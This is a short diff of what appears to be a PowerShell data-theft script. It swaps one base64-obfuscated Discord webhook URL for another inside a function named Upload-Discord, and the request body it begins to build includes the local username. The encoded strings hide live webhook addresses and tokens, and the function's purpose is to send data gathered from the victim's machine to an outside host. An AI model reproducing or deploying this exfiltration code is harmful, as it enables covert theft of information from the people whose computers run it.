@@ -12,7 +12,7 @@ function Upload-Discord {
 		[string]$text 
 	)
 
-	$hookurl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjAzODU4MjI3MDcwMTYwMC90RS1PUnFSdXBPeG5qTXhsZldWaUFxM0ViQkJ3R3pBamlOOXJGUWZKd1Mza2xGZ0Nib0lnWXd0RWpPOUNHWTVILWluVA=="))
+	$hookurl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjA0MjI2NzIzOTM5NTM5OC9EN2JDMkFuRFVfajYybU1EOEVGUENsSmtrMTdPV0w4ZnNqMW5JdkRHckJOWjJfTUZuQlZkQ2ZLRjRkS1Zac2tTU0dMUg=="))
 
 	$Body = @{
 	  'username' = $env:username
